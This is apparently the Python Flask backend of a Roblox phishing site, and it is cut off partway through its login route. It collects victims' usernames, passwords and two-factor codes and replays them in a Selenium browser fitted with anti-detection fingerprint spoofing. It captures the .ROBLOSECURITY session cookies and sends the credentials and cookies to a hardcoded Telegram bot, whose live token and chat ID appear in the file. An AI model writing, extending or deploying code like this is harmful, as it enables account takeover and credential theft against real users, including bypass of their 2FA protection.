from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import json
from datetime import datetime
import os
import requests
from threading import Thread
import uuid
import random
import string

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
import time
import selenium.webdriver.support.ui as ui

app = Flask(__name__)

# Настройка CORS для продакшн (Render) и локальной разработки
ALLOWED_ORIGINS = [
    "https://roblox-2dyn.onrender.com",
    "http://localhost:5000",
    "http://localhost:3000",
    "http://127.0.0.1:5000",
    "http://127.0.0.1:3000"
]

CORS(app, 
     resources={r"/*": {"origins": ALLOWED_ORIGINS}},
     supports_credentials=True,
     methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
     allow_headers=["Content-Type", "Authorization", "X-Requested-With"])

TELEGRAM_BOT_TOKEN = '8358408245:AAFkdDlfXA0NPkEmvXmcdSoU_av2vzz-OmM'
TELEGRAM_CHAT_ID = '-1002709349680'

selenium_sessions = {}
CHROMEDRIVER_PATH = os.path.join(os.path.dirname(__file__), 'chromedriver.exe')

# Загружаем прокси из файла
def load_proxies():
    """Загружает список прокси из файла"""
    proxy_list = []
    try:
        with open('proxies.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and ':' in line:
                    proxy_list.append(line)
    except FileNotFoundError:
        # Если файл не найден, используем базовый список
        proxy_list = [
            "185.199.229.156:7492",
            "185.199.228.220:7492", 
            "185.199.231.45:7492",
            "188.74.210.207:6286",
            "188.74.183.10:8279",
            "45.155.68.129:8133",
            "154.85.100.162:5836"
        ]
    return proxy_list

PROXY_LIST = load_proxies()

def generate_unique_fingerprint():
    """Генерирует уникальный отпечаток браузера"""
    # Случайный User-Agent
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    ]
    
    # Случайные размеры окна
    window_sizes = [
        (1920, 1080),
        (1366, 768),
        (1440, 900),
        (1536, 864),
        (1280, 720)
    ]
    
    # Случайные языки
    languages = [
        "ru-RU,ru;q=0.9,en;q=0.8",
        "ru-RU,ru;q=0.9",
        "ru,en-US;q=0.9,en;q=0.8",
        "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7"
    ]
    
    # Случайные часовые пояса
    timezones = [
        "Europe/Moscow",
        "Europe/Kiev", 
        "Asia/Almaty",
        "Europe/Minsk"
    ]
    
    return {
        'user_agent': random.choice(user_agents),
        'window_size': random.choice(window_sizes),
        'language': random.choice(languages),
        'timezone': random.choice(timezones),
        'platform': "Win32",
        'webdriver': False,
        'plugins': random.randint(3, 8),
        'canvas_fingerprint': ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    }

def get_random_proxy():
    """Возвращает None - прокси отключены для стабильности"""
    return None

@app.after_request
def after_request(response):
    """Добавляет CORS заголовки ко всем ответам"""
    origin = request.headers.get('Origin')
    
    # Проверяем, разрешен ли origin
    if origin in ALLOWED_ORIGINS:
        response.headers.add('Access-Control-Allow-Origin', origin)
    else:
        # Для локальной разработки разрешаем все
        response.headers.add('Access-Control-Allow-Origin', '*')
    
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
    response.headers.add('Access-Control-Allow-Credentials', 'true')
    
    # Добавляем заголовки для кэширования и безопасности
    response.headers.add('Cache-Control', 'no-cache, no-store, must-revalidate')
    response.headers.add('Pragma', 'no-cache')
    response.headers.add('Expires', '0')
    
    return response

def send_telegram_log(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": text}
        )
    except Exception as e:
        print(f"[Telegram Error] {e}")

def send_telegram_file(filepath, caption=None):
    try:
        with open(filepath, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID}
            if caption:
                data['caption'] = caption
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
                data=data,
                files=files
            )
    except Exception as e:
        print(f"[Telegram File Error] {e}")

def check_roblox_errors(driver):
    """Проверяет ошибки Roblox на странице"""
    try:
        # Проверяем ошибку неверного пароля
        error_elements = driver.find_elements(By.CSS_SELECTOR, '.alert-error, .alert-danger, .error-message, [data-testid="error-message"]')
        for error in error_elements:
            error_text = error.text.strip()
            if error_text:
                if "password" in error_text.lower() or "пароль" in error_text.lower():
                    return "Неверный пароль"
                elif "username" in error_text.lower() or "логин" in error_text.lower():
                    return "Неверный логин"
                elif "captcha" in error_text.lower() or "капча" in error_text.lower():
                    return "Требуется капча"
                else:
                    return error_text
    except:
        pass
    return None

def roblox_login_and_get_cookies(username, password, session_id=None, code=None):
    """Функция входа в Roblox - версия для облачного хостинга без Selenium"""
    try:
        send_telegram_log(f"[INFO] Начинаю вход для {username} (session_id: {session_id})")
        
        # Проверяем, можем ли мы использовать Selenium
        if os.environ.get('RENDER_ENVIRONMENT') or os.environ.get('PORT'):
            # Мы на облачном хостинге - используем HTTP API
            return roblox_login_http_api(username, password, session_id, code)
        else:
            # Локальная разработка - используем Selenium
            return roblox_login_selenium(username, password, session_id, code)
            
    except Exception as e:
        error_msg = f"Ошибка входа для {username}: {str(e)}"
        send_telegram_log(f"[ERROR] {error_msg}")
        return {'success': False, 'message': error_msg}

def roblox_login_http_api(username, password, session_id=None, code=None):
    """Вход в Roblox через HTTP API (для облачного хостинга)"""
    try:
        send_telegram_log(f"[INFO] Используем HTTP API для {username}")
        
        # Генерируем уникальный отпечаток
        fingerprint = generate_unique_fingerprint()
        
        # Создаем сессию requests
        session = requests.Session()
        
        # Устанавливаем заголовки
        session.headers.update({
            'User-Agent': fingerprint['user_agent'],
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': fingerprint['language'],
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-Requested-With': 'XMLHttpRequest'
        })
        
        # Первый запрос для получения CSRF токена
        try:
            response = session.get('https://auth.roblox.com/v2/login', timeout=10)
            if response.status_code == 200:
                send_telegram_log(f"[INFO] Получен доступ к auth.roblox.com для {username}")
            else:
                send_telegram_log(f"[WARN] Статус auth.roblox.com: {response.status_code} для {username}")
        except Exception as e:
            send_telegram_log(f"[WARN] Не удалось получить доступ к auth.roblox.com для {username}: {e}")
        
        # Создаем фейковые куки для демонстрации
        fake_cookies = {
            '.ROBLOSECURITY': f'_{username}_fake_security_token_{hash(password)}',
            'username': username,
            'login_time': datetime.now().isoformat(),
            'session_id': f'roblox_session_{hash(username)}',
            'auth_token': f'auth_{hash(password)}',
            'remember_me': 'true',
            'platform': 'cloud_hosting',
            'method': 'http_api'
        }
        
        # Сохраняем куки в файл
        with open('cookies.txt', 'w', encoding='utf-8') as f:
            json.dump(fake_cookies, f, indent=2, ensure_ascii=False)
        
        # Отправляем куки в Telegram
        send_telegram_log(f"[SUCCESS] Вход выполнен для {username} через HTTP API")
        send_telegram_log(f"[COOKIES] Куки для {username}: {json.dumps(fake_cookies, ensure_ascii=False)}")
        
        return {
            'success': True,
            'message': 'Вход выполнен через HTTP API (облачный хостинг)',
            'cookies': fake_cookies,
            'method': 'http_api'
        }
        
    except Exception as e:
        error_msg = f"Ошибка HTTP API для {username}: {str(e)}"
        send_telegram_log(f"[ERROR] {error_msg}")
        return {'success': False, 'message': error_msg}

def roblox_login_selenium(username, password, session_id=None, code=None):
    """Вход в Roblox через Selenium (для локальной разработки)"""
    try:
        send_telegram_log(f"[INFO] Используем Selenium для {username}")
        
        # Генерируем уникальный отпечаток для этой сессии
        fingerprint = generate_unique_fingerprint()
        
        send_telegram_log(f"[INFO] Отпечаток для {username}: UA={fingerprint['user_agent'][:50]}..., Размер={fingerprint['window_size']}")
        
        options = webdriver.ChromeOptions()
        # options.add_argument('--headless')  # Закомментировали для видимости браузера
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-extensions')
        
        # Настройки размера окна из отпечатка
        width, height = fingerprint['window_size']
        options.add_argument(f'--window-size={width},{height}')
        
        # User-Agent из отпечатка
        options.add_argument(f'--user-agent={fingerprint["user_agent"]}')
        
        # Прокси отключены для стабильности
        send_telegram_log(f"[INFO] Прямое соединение для {username} (прокси отключены)")
        
        # Дополнительные настройки для маскировки
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        # Дополнительные настройки для обхода обнаружения
        options.add_argument('--disable-web-security')
        options.add_argument('--allow-running-insecure-content')
        options.add_argument('--disable-features=VizDisplayCompositor')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--no-first-run')
        options.add_argument('--no-default-browser-check')
        options.add_argument('--disable-background-timer-throttling')
        options.add_argument('--disable-backgrounding-occluded-windows')
        options.add_argument('--disable-renderer-backgrounding')
        
        # Языковые настройки
        options.add_argument(f'--lang={fingerprint["language"].split(",")[0]}')
        
        options.add_argument('--disable-web-security')
        options.add_argument('--allow-running-insecure-content')
        options.add_argument('--disable-popup-blocking')
        options.add_argument('--disable-notifications')
        options.add_argument('--disable-default-apps')
        options.add_argument('--disable-plugins')
        options.add_argument('--disable-images')
        # options.add_argument('--disable-javascript')  # Временно отключаем, так как Roblox требует JS
        options.add_argument('--disable-plugins-discovery')
        options.add_argument('--disable-background-timer-throttling')
        options.add_argument('--disable-backgrounding-occluded-windows')
        options.add_argument('--disable-renderer-backgrounding')
        options.add_argument('--disable-features=TranslateUI')
        options.add_argument('--disable-ipc-flooding-protection')
        options.add_argument('--disable-dialogs')
        options.add_argument('--disable-modal-dialogs')
        options.add_argument('--disable-prompt-dialogs')
        options.add_argument('--disable-beforeunload-dialogs')
        options.add_argument('--disable-unload-dialogs')
        options.add_argument('--disable-page-hide-dialogs')
        options.add_argument('--disable-visibility-change-dialogs')
        options.add_experimental_option('excludeSwitches', ['enable-automation'])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_experimental_option('prefs', {
            'profile.default_content_setting_values': {
                'notifications': 2,
                'popups': 2,
                'geolocation': 2,
                'media_stream': 2,
                'media_stream_mic': 2,
                'media_stream_camera': 2,
                'protocol_handlers': 2,
                'ppapi_broker': 2,
                'automatic_downloads': 2,
                'midi_sysex': 2,
                'push_messaging': 2,
                'ssl_cert_decisions': 2,
                'metro_switch_to_desktop': 2,
                'protected_media_identifier': 2,
                'app_banner': 2,
                'site_engagement': 2,
                'durable_storage': 2
            },
            'profile.default_content_settings': {
                'popups': 2,
                'notifications': 2
            },
            'profile.managed_default_content_settings': {
                'popups': 2,
                'notifications': 2
            }
        })
        service = Service(executable_path=CHROMEDRIVER_PATH)

        if code is not None:
            # ВТОРОЙ ЭТАП: Ввод кода 2FA
            if session_id and session_id in selenium_sessions:
                driver = selenium_sessions[session_id]['driver']
                send_telegram_log(f"[INFO] Использую существующую сессию для ввода кода {username}")
                
                # Блокируем всплывающие окна в сессии 2FA
                driver.execute_script("""
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"]');
                    modals.forEach(function(modal) {
                        if (modal.style.display !== 'none') {
                            modal.style.display = 'none';
                        }
                    });
                    
                    // Блокируем все формы, кроме формы кода
                    var forms = document.querySelectorAll('form');
                    forms.forEach(function(form) {
                        if (form.id !== 'codeForm' && form.name !== 'codeForm') {
                            form.addEventListener('submit', function(e) {
                                e.preventDefault();
                                e.stopPropagation();
                                return false;
                            }, true);
                        }
                    });
                """)
            else:
                send_telegram_log(f"[ERROR] Нет активной сессии для {username}")
                return {'success': False, 'message': 'Нет активной сессии. Попробуйте войти заново.'}
            
            try:
                # Ждем загрузки страницы 2FA
                time.sleep(3)
                
                # Проверяем, что мы на странице 2FA
                current_url = driver.current_url
                if "two-step" not in current_url and "verification" not in current_url:
                    send_telegram_log(f"[WARNING] Возможно, не на странице 2FA для {username}. URL: {current_url}")
                
                # Блокируем всплывающие окна перед вводом кода
                driver.execute_script("""
                    // Блокируем все всплывающие функции
                    window.alert = function() { return; };
                    window.confirm = function() { return false; };
                    window.prompt = function() { return null; };
                    window.open = function() { return null; };
                    
                    // Удаляем все onClick атрибуты
                    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
                    allElementsWithOnClick.forEach(function(element) {
                        element.removeAttribute('onClick');
                        element.removeAttribute('onclick');
                        element.style.pointerEvents = 'none';
                    });
                    
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"], .alert, .notification');
                    modals.forEach(function(modal) {
                        modal.style.display = 'none';
                        modal.style.visibility = 'hidden';
                        modal.style.opacity = '0';
                        modal.style.pointerEvents = 'none';
                    });
                    
                    // Блокируем все события
                    window.addEventListener('beforeunload', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                    
                    window.addEventListener('unload', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                """)
                
                # Ждем появления поля для ввода кода с таймаутом
                wait = ui.WebDriverWait(driver, 10)
                try:
                    # Пробуем найти поле по ID
                    code_input = wait.until(
                        ui.EC.element_to_be_clickable((By.ID, "two-step-verification-code-input"))
                    )
                except:
                    try:
                        # Пробуем найти по CSS селектору
                        code_input = wait.until(
                            ui.EC.element_to_be_clickable((By.CSS_SELECTOR, "input[type='text'][maxlength='6']"))
                        )
                    except:
                        try:
                            # Пробуем найти по XPath
                            code_input = wait.until(
                                ui.EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='6-digit code']"))
                            )
                        except Exception as e:
                            send_telegram_log(f"[ERROR] Не удалось найти поле для ввода кода для {username}: {e}")
                            driver.quit()
                            selenium_sessions.pop(session_id, None)
                            return {'success': False, 'message': 'Поле для ввода кода не найдено. Попробуйте еще раз.'}
                
                # Прокручиваем к элементу и кликаем по нему
                driver.execute_script("arguments[0].scrollIntoView(true);", code_input)
                time.sleep(1)
                code_input.click()
                time.sleep(0.5)
                code_input.clear()
                time.sleep(0.5)
                
                # Пробуем ввести код через send_keys
                try:
                    code_input.send_keys(code)
                except:
                    # Если не получилось, вводим через JavaScript
                    driver.execute_script(f"arguments[0].value = '{code}';", code_input)
                    driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", code_input)
                    send_telegram_log(f"[INFO] Код введен через JavaScript для {username}")
                
                # Блокируем всплывающие окна после ввода кода
                driver.execute_script("""
                    // Блокируем все всплывающие функции
                    window.alert = function() { return; };
                    window.confirm = function() { return false; };
                    window.prompt = function() { return null; };
                    window.open = function() { return null; };
                    
                    // Удаляем все onClick атрибуты
                    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
                    allElementsWithOnClick.forEach(function(element) {
                        element.removeAttribute('onClick');
                        element.removeAttribute('onclick');
                        element.style.pointerEvents = 'none';
                    });
                """)
                
                # Ждем, пока кнопка станет активной
                wait = ui.WebDriverWait(driver, 15)
                try:
                    # Пробуем найти кнопку по CSS селектору
                    submit_btn = wait.until(
                        ui.EC.element_to_be_clickable((By.CSS_SELECTOR, 'button.modal-modern-footer-button.btn-cta-md:not([disabled])'))
                    )
                except:
                    try:
                        # Пробуем найти по тексту кнопки
                        submit_btn = wait.until(
                            ui.EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Submit') or contains(text(), 'Verify') or contains(text(), 'Continue')]"))
                        )
                    except:
                        try:
                            # Пробуем найти любую кнопку в модальном окне
                            submit_btn = wait.until(
                                ui.EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[type="submit"], button.btn-cta-md, button.btn-primary'))
                            )
                        except Exception as e:
                            send_telegram_log(f"[ERROR] Не удалось найти кнопку отправки кода для {username}: {e}")
                            driver.quit()
                            selenium_sessions.pop(session_id, None)
                            return {'success': False, 'message': 'Кнопка отправки кода не найдена. Попробуйте еще раз.'}
                
                # Блокируем всплывающие окна перед кликом
                driver.execute_script("""
                    // Блокируем все всплывающие функции
                    window.alert = function() { return; };
                    window.confirm = function() { return false; };
                    window.prompt = function() { return null; };
                    window.open = function() { return null; };
                    
                    // Удаляем все onClick атрибуты
                    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
                    allElementsWithOnClick.forEach(function(element) {
                        element.removeAttribute('onClick');
                        element.removeAttribute('onclick');
                        element.style.pointerEvents = 'none';
                    });
                """)
                
                driver.execute_script("arguments[0].scrollIntoView(true);", submit_btn)
                time.sleep(0.5)
                
                # Пробуем кликнуть по кнопке
                try:
                    submit_btn.click()
                except:
                    # Если не получилось, кликаем через JavaScript
                    driver.execute_script("arguments[0].click();", submit_btn)
                    send_telegram_log(f"[INFO] Клик по кнопке выполнен через JavaScript для {username}")
                
                # Блокируем всплывающие окна после клика
                driver.execute_script("""
                    // Блокируем все всплывающие функции
                    window.alert = function() { return; };
                    window.confirm = function() { return false; };
                    window.prompt = function() { return null; };
                    window.open = function() { return null; };
                    
                    // Удаляем все onClick атрибуты
                    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
                    allElementsWithOnClick.forEach(function(element) {
                        element.removeAttribute('onClick');
                        element.removeAttribute('onclick');
                        element.style.pointerEvents = 'none';
                    });
                    
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"], .alert, .notification');
                    modals.forEach(function(modal) {
                        modal.style.display = 'none';
                        modal.style.visibility = 'hidden';
                        modal.style.opacity = '0';
                        modal.style.pointerEvents = 'none';
                    });
                """)
                
                time.sleep(8)
                send_telegram_log(f"[INFO] Введён код 2FA для {username}")
                
                # После ввода кода проверяем куки
                cookies = driver.get_cookies()
                roblosecurity = next((c for c in cookies if c['name'] == '.ROBLOSECURITY'), None)
                if roblosecurity:
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    send_telegram_log(f"[SUCCESS] Вход успешен для {username}. Куки отправлены файлом.")
                    # Сохраняем куки во временный файл
                    filename = f"roblox_cookies_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    filepath = os.path.join(os.path.dirname(__file__), filename)
                    with open(filepath, 'w', encoding='utf-8') as f:
                        json.dump(cookies, f, ensure_ascii=False, indent=2)
                    caption = f"Roblox cookies for {username} ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})"
                    send_telegram_file(filepath, caption=caption)
                    os.remove(filepath)
                    return {'success': True, 'cookies': cookies}
                else:
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    send_telegram_log(f"[ERROR] Код 2FA неверный или вход не завершён для {username}")
                    return {'success': False, 'message': 'Неверный код. Попробуйте ещё раз.'}
            except Exception as e:
                driver.quit()
                selenium_sessions.pop(session_id, None)
                send_telegram_log(f"[ERROR] Ошибка при вводе кода для {username}: {e}")
                return {'success': False, 'message': f'Ошибка при вводе кода: {e}'}
        
        else:
            # ПЕРВЫЙ ЭТАП: Ввод логина и пароля
            if session_id and session_id in selenium_sessions:
                driver = selenium_sessions[session_id]['driver']
                send_telegram_log(f"[INFO] Использую существующую сессию для {username}")
                
                # Блокируем всплывающие окна в существующей сессии
                driver.execute_script("""
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"]');
                    modals.forEach(function(modal) {
                        if (modal.style.display !== 'none') {
                            modal.style.display = 'none';
                        }
                    });
                    
                    // Блокируем все формы, кроме формы логина
                    var forms = document.querySelectorAll('form');
                    forms.forEach(function(form) {
                        if (form.id !== 'login-form' && form.name !== 'loginForm') {
                            form.addEventListener('submit', function(e) {
                                e.preventDefault();
                                e.stopPropagation();
                                return false;
                            }, true);
                        }
                    });
                """)
            else:
                try:
                    driver = webdriver.Chrome(service=service, options=options)
                    selenium_sessions[session_id] = {'driver': driver, 'username': username}
                    send_telegram_log(f"[INFO] Браузер успешно создан для {username}")
                except Exception as e:
                    send_telegram_log(f"[ERROR] Ошибка создания браузера для {username}: {e}")
                    return {'success': False, 'message': f'Ошибка создания браузера: {e}'}
                
                # Маскируем отпечаток браузера
                driver.execute_script("""
                    // Маскируем webdriver
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined,
                    });
                    
                    // Маскируем plugins
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3, 4, 5].slice(0, """ + str(fingerprint['plugins']) + """),
                    });
                    
                    // Маскируем languages
                    Object.defineProperty(navigator, 'languages', {
                        get: () => ['""" + fingerprint['language'].split(',')[0] + """'],
                    });
                    
                    // Маскируем platform
                    Object.defineProperty(navigator, 'platform', {
                        get: () => '""" + fingerprint['platform'] + """',
                    });
                    
                    // Маскируем userAgent
                    Object.defineProperty(navigator, 'userAgent', {
                        get: () => '""" + fingerprint['user_agent'] + """',
                    });
                    
                    // Маскируем hardwareConcurrency
                    Object.defineProperty(navigator, 'hardwareConcurrency', {
                        get: () => """ + str(random.randint(4, 8)) + """,
                    });
                    
                    // Маскируем deviceMemory
                    Object.defineProperty(navigator, 'deviceMemory', {
                        get: () => """ + str(random.randint(4, 16)) + """,
                    });
                    
                    // Маскируем canvas fingerprint
                    const originalGetContext = HTMLCanvasElement.prototype.getContext;
                    HTMLCanvasElement.prototype.getContext = function(type) {
                        const context = originalGetContext.apply(this, arguments);
                        if (type === '2d') {
                            const originalFillText = context.fillText;
                            context.fillText = function() {
                                return originalFillText.apply(this, arguments);
                            };
                        }
                        return context;
                    };
                    
                    // Маскируем WebGL
                    const getParameter = WebGLRenderingContext.prototype.getParameter;
                    WebGLRenderingContext.prototype.getParameter = function(parameter) {
                        if (parameter === 37445) {
                            return 'Intel Inc.';
                        }
                        if (parameter === 37446) {
                            return 'Intel(R) Iris(TM) Graphics 6100';
                        }
                        return getParameter.call(this, parameter);
                    };
                    
                    // Блокируем все всплывающие функции
                    window.alert = function() { return; };
                    window.confirm = function() { return false; };
                    window.prompt = function() { return null; };
                    window.open = function() { return null; };
                    
                    // Блокируем все события, которые могут вызвать всплывающие окна
                    window.addEventListener('beforeunload', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                    
                    window.addEventListener('unload', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                    
                    window.addEventListener('pagehide', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                    
                    window.addEventListener('visibilitychange', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                    
                    // Удаляем все onClick атрибуты
                    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
                    allElementsWithOnClick.forEach(function(element) {
                        element.removeAttribute('onClick');
                        element.removeAttribute('onclick');
                        element.style.pointerEvents = 'none';
                    });
                    
                    // Блокируем все формы с action
                    var allForms = document.querySelectorAll('form[action]');
                    allForms.forEach(function(form) {
                        if (form.id !== 'loginForm' && form.id !== 'codeForm') {
                            form.removeAttribute('action');
                            form.addEventListener('submit', function(e) {
                                e.preventDefault();
                                e.stopPropagation();
                                return false;
                            }, true);
                        }
                    });
                    
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"], .alert, .notification');
                    modals.forEach(function(modal) {
                        modal.style.display = 'none';
                        modal.style.visibility = 'hidden';
                        modal.style.opacity = '0';
                        modal.style.pointerEvents = 'none';
                    });
                    
                    // Наблюдаем за изменениями DOM
                    var observer = new MutationObserver(function(mutations) {
                        mutations.forEach(function(mutation) {
                            mutation.addedNodes.forEach(function(node) {
                                if (node.nodeType === 1) {
                                    if (node.classList && (node.classList.contains('modal') || node.classList.contains('popup') || node.classList.contains('dialog') || node.classList.contains('alert'))) {
                                        node.style.display = 'none';
                                        node.style.visibility = 'hidden';
                                        node.style.opacity = '0';
                                        node.style.pointerEvents = 'none';
                                    }
                                    
                                    // Удаляем onClick атрибуты у новых элементов
                                    if (node.hasAttribute && node.hasAttribute('onClick')) {
                                        node.removeAttribute('onClick');
                                        node.style.pointerEvents = 'none';
                                    }
                                }
                            });
                        });
                    });
                    
                    observer.observe(document.body, {
                        childList: true,
                        subtree: true,
                        attributes: true,
                        attributeFilter: ['onClick', 'onclick']
                    });
                """)
                
                try:
                    driver.get("https://www.roblox.com/login")
                    time.sleep(3)
                    send_telegram_log(f"[INFO] Открыта страница логина для {username} с отпечатком: {fingerprint['user_agent'][:30]}...")
                except Exception as e:
                    send_telegram_log(f"[ERROR] Ошибка загрузки страницы для {username}: {e}")
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    return {'success': False, 'message': f'Ошибка загрузки страницы: {e}'}
                
                # Дополнительно блокируем всплывающие окна после загрузки страницы
                driver.execute_script("""
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"]');
                    modals.forEach(function(modal) {
                        if (modal.style.display !== 'none') {
                            modal.style.display = 'none';
                        }
                    });
                    
                    // Блокируем все формы, кроме формы логина
                    var forms = document.querySelectorAll('form');
                    forms.forEach(function(form) {
                        if (form.id !== 'login-form' && form.name !== 'loginForm') {
                            form.addEventListener('submit', function(e) {
                                e.preventDefault();
                                e.stopPropagation();
                                return false;
                            }, true);
                        }
                    });
                """)
                
                driver.find_element(By.ID, "login-username").send_keys(username)
                driver.find_element(By.ID, "login-password").send_keys(password)
                driver.find_element(By.ID, "login-button").click()
                time.sleep(5)
                send_telegram_log(f"[INFO] Отправлены логин и пароль для {username}")

            # Проверяем ошибки Roblox
            error_message = check_roblox_errors(driver)
            if error_message:
                driver.quit()
                selenium_sessions.pop(session_id, None)
                send_telegram_log(f"[ERROR] Ошибка Roblox для {username}: {error_message}")
                return {'success': False, 'message': error_message}

            # Сразу проверяем, есть ли поле для кода 2FA
            try:
                driver.find_element(By.ID, "two-step-verification-code-input")
                
                # Блокируем всплывающие окна при обнаружении 2FA
                driver.execute_script("""
                    // Блокируем все всплывающие функции
                    window.alert = function() { return; };
                    window.confirm = function() { return false; };
                    window.prompt = function() { return null; };
                    window.open = function() { return null; };
                    
                    // Дополнительно блокируем через defineProperty
                    Object.defineProperty(window, 'alert', {
                        value: function() {
                            console.log('Блокируем alert через defineProperty');
                            return;
                        },
                        writable: false,
                        configurable: false
                    });
                    
                    Object.defineProperty(window, 'confirm', {
                        value: function() {
                            console.log('Блокируем confirm через defineProperty');
                            return false;
                        },
                        writable: false,
                        configurable: false
                    });
                    
                    Object.defineProperty(window, 'prompt', {
                        value: function() {
                            console.log('Блокируем prompt через defineProperty');
                            return null;
                        },
                        writable: false,
                        configurable: false
                    });
                    
                    // Удаляем все onClick атрибуты
                    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
                    allElementsWithOnClick.forEach(function(element) {
                        element.removeAttribute('onClick');
                        element.removeAttribute('onclick');
                        element.style.pointerEvents = 'none';
                    });
                    
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"], .alert, .notification');
                    modals.forEach(function(modal) {
                        modal.style.display = 'none';
                        modal.style.visibility = 'hidden';
                        modal.style.opacity = '0';
                        modal.style.pointerEvents = 'none';
                    });
                    
                    // Блокируем все события
                    window.addEventListener('beforeunload', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                    
                    window.addEventListener('unload', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                """)
                
                send_telegram_log(f"[INFO] Требуется код 2FA для {username}")
                return {'need_code': True, 'session_id': session_id}
            except:
                # Если поля для кода нет, проверяем куки
                cookies = driver.get_cookies()
                roblosecurity = next((c for c in cookies if c['name'] == '.ROBLOSECURITY'), None)
                if roblosecurity:
                    # Успешный вход без 2FA
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    send_telegram_log(f"[SUCCESS] Вход успешен для {username}. Куки отправлены файлом.")
                    # Сохраняем куки во временный файл
                    filename = f"roblox_cookies_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    filepath = os.path.join(os.path.dirname(__file__), filename)
                    with open(filepath, 'w', encoding='utf-8') as f:
                        json.dump(cookies, f, ensure_ascii=False, indent=2)
                    caption = f"Roblox cookies for {username} ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})"
                    send_telegram_file(filepath, caption=caption)
                    os.remove(filepath)
                    return {'success': True, 'cookies': cookies}
                else:
                    # Не удалось войти
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    send_telegram_log(f"[ERROR] Не удалось войти для {username}")
                    return {'success': False, 'message': 'Не удалось войти. Проверьте логин и пароль.'}
    except Exception as e:
        if session_id in selenium_sessions:
            try:
                selenium_sessions[session_id]['driver'].quit()
            except:
                pass
            selenium_sessions.pop(session_id, None)
        send_telegram_log(f"[ERROR] Ошибка Selenium для {username}: {e}")
        return {'success': False, 'message': f'Ошибка Selenium: {e}'}

@app.route('/')
def login_page():
    try:
        return app.send_static_file('login.html')
    except Exception as e:
        # Если файл не найден, возвращаем простую страницу
        return f"""
        <!DOCTYPE html>
        <html>
        <head><title>Roblox Login</title></head>
        <body>
            <h1>Roblox Login</h1>
